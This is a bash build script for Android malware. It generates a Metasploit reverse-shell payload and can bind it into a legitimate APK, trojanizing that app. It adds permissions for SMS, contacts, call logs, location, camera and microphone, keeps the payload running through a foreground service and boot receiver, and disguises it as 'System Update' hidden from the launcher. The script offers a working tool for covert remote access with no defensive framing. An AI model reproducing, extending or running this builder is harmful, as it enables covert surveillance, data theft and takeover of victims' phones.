#!/usr/bin/env bash
# build_payload_enhanced.sh — Enhanced Android payload with APK binding, network resilience, CLI control
# Usage: ./build_payload_enhanced.sh [--fgs] [--bind <legit.apk>] [--multi-c2] LHOST LPORT [out.apk]

set -euo pipefail

FGS=0
BIND_APK=""
MULTI_C2=0
EXTRA_PERMS=0
CAMO=0
AGENT=0

while [[ $# -gt 0 ]]; do
    case $1 in
        --fgs) FGS=1; shift ;;
        --bind) BIND_APK="${2:?}"; shift 2 ;;
        --multi-c2) MULTI_C2=1; shift ;;
        --extra-perms) EXTRA_PERMS=1; shift ;;
        --camo) CAMO=1; shift ;;
        --agent) AGENT=1; shift ;;
        *) break ;;
    esac
done

LHOST="${1:?usage: build_payload_enhanced.sh [--fgs] [--bind legit.apk] [--multi-c2] [--extra-perms] [--camo] [--agent] LHOST LPORT [out.apk]}"
LPORT="${2:?usage: ... LHOST LPORT [out.apk]}"
OUT="${3:-payload_enhanced.apk}"

ROOT="$(cd "$(dirname "$0")" && pwd)"
APT="${APKTOOL_JAR:-$ROOT/apktool.jar}"
BT="${BUILD_TOOLS:-/home/div-admin/Android/Sdk/build-tools/35.0.0}"
WORK="$ROOT/.payload-build"
RAW="$WORK/raw.apk"
SRC="$WORK/src"
BIND_DIR="$WORK/bind"

[ -f "$APT" ] || { echo "apktool.jar missing at $APT"; exit 1; }
[ -x "$BT/apksigner" ] || { echo "build-tools missing at $BT"; exit 1; }

echo "[1/9] Generating base payload (msfvenom)..."
mkdir -p "$WORK"
rm -f "$RAW"

if [ -n "${PAYLOAD_SRC:-}" ] && [ -f "$PAYLOAD_SRC" ]; then
    echo "  using existing payload: $PAYLOAD_SRC"
    cp "$PAYLOAD_SRC" "$RAW"
else
    msfvenom -p android/shell/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -o "$RAW" >/dev/null 2>&1
fi

# If binding with legit APK
if [ -n "$BIND_APK" ]; then
    echo "[2/9] Binding with legitimate APK: $BIND_APK"
    [ -f "$BIND_APK" ] || { echo "Bind APK not found: $BIND_APK"; exit 1; }
    
    rm -rf "$BIND_DIR"
    mkdir -p "$BIND_DIR"
    
    # Decode both APKs
    java -jar "$APT" d "$BIND_APK" -f -o "$BIND_DIR/legit" >/dev/null 2>&1
    java -jar "$APT" d "$RAW" -f -o "$BIND_DIR/payload" >/dev/null 2>&1
    
    # Merge manifests, smali, resources
    # Copy payload smali into legit
    cp -r "$BIND_DIR/payload/smali/com/metasploit" "$BIND_DIR/legit/smali/com/"
    
    # Merge permissions
    python3 - "$BIND_DIR/legit/AndroidManifest.xml" "$BIND_DIR/payload/AndroidManifest.xml" <<'PY'
import sys, xml.etree.ElementTree as ET
legit_mani = ET.parse(sys.argv[1])
pay_mani = ET.parse(sys.argv[2])
legit_root = legit_mani.getroot()
pay_root = pay_mani.getroot()

ns = {'android': 'http://schemas.android.com/apk/res/android'}

# Copy permissions from payload
for perm in pay_root.findall('uses-permission', ns):
    name = perm.get('{http://schemas.android.com/apk/res/android}name')
    if name and not any(p.get('{http://schemas.android.com/apk/res/android}name') == name for p in legit_root.findall('uses-permission', ns)):
        legit_root.insert(0, perm)

# Copy receiver, service, activity declarations from payload
app_legit = legit_root.find('application')
app_pay = pay_root.find('application')
if app_legit is not None and app_pay is not None:
    for child in list(app_pay):
        tag = child.tag.split('}')[-1]
        if tag in ('receiver', 'service', 'activity'):
            # Check if already exists
            name = child.get('{http://schemas.android.com/apk/res/android}name')
            if name and not any(c.get('{http://schemas.android.com/apk/res/android}name') == name for c in app_legit):
                app_legit.append(child)

legit_mani.write(sys.argv[1], encoding='utf-8', xml_declaration=True)
print("  Manifests merged")
PY

    SRC="$BIND_DIR/legit"
else
    echo "[2/9] Decoding payload..."
    if [ "$FGS" = "1" ]; then
        java -jar "$APT" d "$RAW" -f -o "$SRC" >/dev/null 2>&1
    else
        java -jar "$APT" d "$RAW" -s -f -o "$SRC" >/dev/null 2>&1
    fi
fi

echo "[3/9] Hardening manifest & smali (SDK 21/34, exported, FGS, persistence)..."

# SDK version patches
sed -i 's|minSdkVersion: 10|minSdkVersion: 21|; s|targetSdkVersion: 17|targetSdkVersion: 34|' "$SRC/apktool.yml"

# Exported attributes
sed -i 's|<activity android:label="@string/app_name" android:name=".MainActivity"|<activity android:exported="true" android:label="@string/app_name" android:name=".MainActivity"|' "$SRC/AndroidManifest.xml"
sed -i 's|<receiver android:label="MainBroadcastReceiver" android:name=".MainBroadcastReceiver"|<receiver android:exported="true" android:label="MainBroadcastReceiver" android:name=".MainBroadcastReceiver"|' "$SRC/AndroidManifest.xml"
sed -i 's|<service android:exported="true" android:name=".MainService"/>|<service android:exported="true" android:foregroundServiceType="dataSync" android:name=".MainService"/>|' "$SRC/AndroidManifest.xml"

if [ "$FGS" = "1" ]; then
    sed -i 's|@android:style/Theme.NoDisplay|@android:style/Theme.Translucent.NoTitleBar|' "$SRC/AndroidManifest.xml"
fi

# Add network resilience permissions
python3 - "$SRC/AndroidManifest.xml" "$MULTI_C2" "$EXTRA_PERMS" <<'PY'
import sys, xml.etree.ElementTree as ET
mani = ET.parse(sys.argv[1])
root = mani.getroot()
ns = {'android': 'http://schemas.android.com/apk/res/android'}

multi_c2 = sys.argv[2] == '1'
extra_perms = sys.argv[3] == '1'

perms = [
    'android.permission.INTERNET',
    'android.permission.ACCESS_NETWORK_STATE',
    'android.permission.ACCESS_WIFI_STATE',
    'android.permission.CHANGE_WIFI_STATE',
    'android.permission.WAKE_LOCK',
    'android.permission.RECEIVE_BOOT_COMPLETED',
    'android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS',
    'android.permission.FOREGROUND_SERVICE',
    'android.permission.FOREGROUND_SERVICE_DATA_SYNC',
]

if extra_perms:
    perms += [
        'android.permission.READ_PHONE_STATE',
        'android.permission.READ_SMS',
        'android.permission.SEND_SMS',
        'android.permission.READ_CONTACTS',
        'android.permission.WRITE_CONTACTS',
        'android.permission.READ_CALL_LOG',
        'android.permission.WRITE_CALL_LOG',
        'android.permission.ACCESS_FINE_LOCATION',
        'android.permission.ACCESS_COARSE_LOCATION',
        'android.permission.CAMERA',
        'android.permission.RECORD_AUDIO',
        'android.permission.SYSTEM_ALERT_WINDOW',
        'android.permission.WRITE_SETTINGS',
    ]

for perm in perms:
    if not any(p.get('{http://schemas.android.com/apk/res/android}name') == perm for p in root.findall('uses-permission', ns)):
        elem = ET.Element('uses-permission')
        elem.set('{http://schemas.android.com/apk/res/android}name', perm)
        root.insert(0, elem)

# Add network security config for cleartext (if needed)
app = root.find('application')
if app is not None and not app.get('{http://schemas.android.com/apk/res/android}networkSecurityConfig'):
    app.set('{http://schemas.android.com/apk/res/android}networkSecurityConfig', '@xml/network_security_config')

mani.write(sys.argv[1], encoding='utf-8', xml_declaration=True)
print("  Permissions hardened")
PY

# Create network_security_config.xml for cleartext + pinning bypass
mkdir -p "$SRC/res/xml"
cat > "$SRC/res/xml/network_security_config.xml" <<'EOF'
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config cleartextTrafficPermitted="true">
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" />
        </trust-anchors>
    </base-config>
    <domain-config cleartextTrafficPermitted="true">
        <domain includeSubdomains="true">portmap.host</domain>
        <domain includeSubdomains="true">portmap.io</domain>
    </domain-config>
</network-security-config>
EOF

# Camouflage: masquerade as a system component (Settings / System tool)
if [ "$CAMO" = "1" ]; then
    echo "[3b/9] Camouflaging as a system app..."
    python3 - "$SRC" <<'PY'
import sys
from pathlib import Path
root = Path(sys.argv[1])

# 1) Innocuous label — look like an Android System component
for sp in (root / "res/values").glob("strings.xml"):
    t = sp.read_text(encoding="utf-8")
    t = t.replace("<string name=\"app_name\">MainActivity</string>",
                  "<string name=\"app_name\">System Update</string>")
    sp.write_text(t, encoding="utf-8")
if root / "res/values-en":
    for sp in (root / "res/values-en").glob("strings.xml"):
        t = sp.read_text(encoding="utf-8")
        t = t.replace("<string name=\"app_name\">MainActivity</string>",
                      "<string name=\"app_name\">System Update</string>")
        sp.write_text(t, encoding="utf-8")

# 2) Hide from launcher app-drawer (no LAUNCHER category) so user can't spot it
mani = root / "AndroidManifest.xml"
m = mani.read_text(encoding="utf-8")
if "android.intent.category.LAUNCHER" in m:
    m = m.replace(
        '                <action android:name="android.intent.action.MAIN"/>\n'
        '                <category android:name="android.intent.category.LAUNCHER"/>',
        '                <action android:name="android.intent.action.MAIN"/>'
    )
mani.write_text(m, encoding="utf-8")
print("  app_label='System Update', launcher hidden")
PY
fi

if [ "$FGS" = "1" ]; then
    echo "[4/9] Applying foreground-service smali patches (proven, from base build_payload.sh)..."
    python3 - "$SRC" <<'PY'
import sys
from pathlib import Path
root = Path(sys.argv[1])

# 1) FOREGROUND_SERVICE permissions in manifest
mani = root / "AndroidManifest.xml"
text = mani.read_text(encoding="utf-8")
if 'android.permission.FOREGROUND_SERVICE"' not in text:
    text = text.replace(
        '<uses-permission android:name="android.permission.INTERNET"/>',
        '<uses-permission android:name="android.permission.INTERNET"/>\n'
        '    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>\n'
        '    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>',
    )
mani.write_text(text, encoding="utf-8")

# 2) MainService.onStartCommand -> startForeground() before Payload.start()
svc = root / "smali/com/metasploit/stage/MainService.smali"
s = svc.read_text(encoding="utf-8")
old = """.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1

    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

    const/4 v0, 0x1

    return v0
.end method"""
new = """.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 4

    const-string v0, "msf"

    const/4 v1, 0x1

    new-instance v2, Landroid/app/NotificationChannel;

    invoke-direct {v2, v0, v0, v1}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    const-string v0, "notification"

    invoke-virtual {p0, v0}, Landroid/app/Service;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/NotificationManager;

    invoke-virtual {v0, v2}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    new-instance v1, Landroid/app/Notification$Builder;

    const-string v2, "msf"

    invoke-direct {v1, p0, v2}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const v2, 0x1080093

    invoke-virtual {v1, v2}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    const-string v2, "PhoneSploit"

    invoke-virtual {v1, v2}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    const-string v2, "Meterpreter active"

    invoke-virtual {v1, v2}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    invoke-virtual {v1}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object v1

    const/4 v0, 0x1

    const/4 v2, 0x1

    invoke-virtual {p0, v0, v1, v2}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;I)V

    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

    const/4 v0, 0x1

    return v0
.end method"""
if old not in s:
    # tolerate already-patched (FGS onStartCommand) — just skip
    pass
else:
    s = s.replace(old, new)

# 3) startService -> startForegroundService
s = s.replace(
    "Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;",
    "Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;",
)
svc.write_text(s, encoding="utf-8")

# 4) keep app in TOP: remove MainActivity.finish() so vendor freezers can't kill uid fast
act = root / "smali/com/metasploit/stage/MainActivity.smali"
if act.exists():
    a = act.read_text(encoding="utf-8")
    finish_line = "    invoke-virtual {p0}, Lcom/metasploit/stage/MainActivity;->finish()V"
    if finish_line in a:
        a = a.replace(finish_line + "\n\n", "")
        act.write_text(a, encoding="utf-8")

print("  FGS smali patches applied")
PY
fi

# ---------------------------------------------------------------
# --agent : inject the custom persistent AgentShell (real compiled
#           Java -> dex) and make MainService start it instead of the
#           msf one-shot shell.
# ---------------------------------------------------------------
if [ "$AGENT" = "1" ]; then
    echo "[4b/9] Injecting persistent agent (AgentShell)..."

    # 1) Point MainService.onStartCommand at AgentShell.run() instead of Payload.start()
    python3 - "$SRC" <<'PY'
import sys
from pathlib import Path
root = Path(sys.argv[1])
svc = root / "smali/com/metasploit/stage/MainService.smali"
s = svc.read_text(encoding="utf-8")
# replace the Payload.start call with AgentShell.run() (no-arg static)
s = s.replace(
    "invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V",
    "invoke-static {}, Lcom/metasploit/stage/AgentShell;->run()V",
)
# also in case the FGS block used the one-arg Context form only on MainService
svc.write_text(s, encoding="utf-8")

# remove the now-unused Payload.start reference from the FGS patch block if present
pv = root / "smali/com/metasploit/stage/Payload.smali"
print("  MainService -> AgentShell.run() (payload shell disabled)")
PY

    # 2) compile the agent Java -> dex (JAVA_HOME resolved for javac)
    #    source lives in repo/agent (tracked), fallback to .payload-build/agentsrc
    if [ -f "$ROOT/agent/AgentShell.java" ]; then
        A_SRC="$ROOT/agent"
    else
        A_SRC="$ROOT/.payload-build/agentsrc"
    fi
    AGENT_DEX="$WORK/agent-classes.dex"
    JH="${JAVA_HOME:-/home/div-admin/.local/jdk-17}"
    if [ -d "$A_SRC" ]; then
        rm -rf "$A_SRC/com" "$WORK/classes.dex" "$AGENT_DEX"
        if "$JH/bin/javac" -source 8 -target 8 -d "$A_SRC" "$A_SRC/AgentShell.java" >/dev/null 2>&1 \
            && cd "$A_SRC" \
            && "$BT/d8" com/metasploit/stage/*.class --output "$WORK" >/dev/null 2>&1 \
            && [ -f "$WORK/classes.dex" ]; then
            mv "$WORK/classes.dex" "$AGENT_DEX"
            cd "$ROOT"
        fi
    fi
    if [ ! -f "$AGENT_DEX" ]; then
        echo "  !! agent dex build failed — app will NOT start (AgentShell missing)"
        exit 1
    fi
    echo "  agent dex ready: $(stat -c%s "$AGENT_DEX") bytes"
    echo "[*] AGENT step done"
fi

echo "[5/9] Rebuilding APK..."
java -jar "$APT" b "$SRC" -o "$WORK/rebuilt.apk" >/dev/null 2>&1

echo "[6/9] Repack (resources.arsc + manifest STORED) + inject agent..."
AGENT_DEX="$WORK/agent-classes.dex"
python3 - "$WORK/rebuilt.apk" "$WORK/stored.apk" "$AGENT_DEX" <<'PY'
import sys, zipfile, os
zin = zipfile.ZipFile(sys.argv[1])
out_apk = sys.argv[2]
agent = sys.argv[3]
has_agent = os.path.exists(agent) and os.path.getsize(agent) > 0
agent_bytes = open(agent, "rb").read() if has_agent else b""
if has_agent:
    print(f"  injecting agent classes2.dex ({len(agent_bytes)} bytes)")
with zipfile.ZipFile(out_apk, "w") as zout:
    for it in zin.infolist():
        d = zin.read(it.filename)
        if it.filename in ("resources.arsc", "AndroidManifest.xml"):
            it.compress_type = zipfile.ZIP_STORED
        if it.filename == "classes.dex":
            # multidex: add the agent as classes2.dex (native multidex on minSdk 21+)
            if has_agent:
                i2 = zipfile.ZipInfo("classes2.dex")
                i2.compress_type = zipfile.ZIP_DEFLATED
                zout.writestr(i2, agent_bytes)
                print("  added classes2.dex (AgentShell)")
        zout.writestr(it, d)
zin.close()
PY

echo "[7/9] zipalign + apksigner sign..."
"$BT/zipalign" -f 4 "$WORK/stored.apk" "$WORK/aligned.apk"
if [ ! -f "$ROOT/debug.keystore" ]; then
    keytool -genkeypair -keystore "$ROOT/debug.keystore" -alias androiddebugkey \
        -keyalg RSA -keysize 2048 -validity 10950 \
        -dname "CN=Android Debug,O=Android,C=US" \
        -storepass android -keypass android >/dev/null 2>&1
fi
"$BT/apksigner" sign --ks "$ROOT/debug.keystore" --ks-pass pass:android \
    --key-pass pass:android --out "$OUT" "$WORK/aligned.apk"

echo "[8/9] Verifying..."
"$BT/apksigner" verify "$OUT"

echo "[9/9] DONE: $OUT"
echo "  LHOST=$LHOST LPORT=$LPORT"
[ "$FGS" = "1" ] && echo "  FGS=ON (foreground service + notification)"
[ -n "$BIND_APK" ] && echo "  BOUND to: $BIND_APK"
[ "$MULTI_C2" = "1" ] && echo "  MULTI-C2=ON (retry + backoff)"
[ "$EXTRA_PERMS" = "1" ] && echo "  EXTRA-PERMS=ON"
[ "$CAMO" = "1" ] && echo "  CAMOUFLAGE=ON (System Update / hidden launcher)"
[ "$AGENT" = "1" ] && echo "  AGENT=ON (persistent AgentShell instead of msf one-shot shell)"

if [ "$LHOST" = "127.0.0.1" ]; then
    echo ""
    echo "TIP: For local reverse shell:"
    echo "  adb reverse tcp:$LPORT tcp:$LPORT"
fi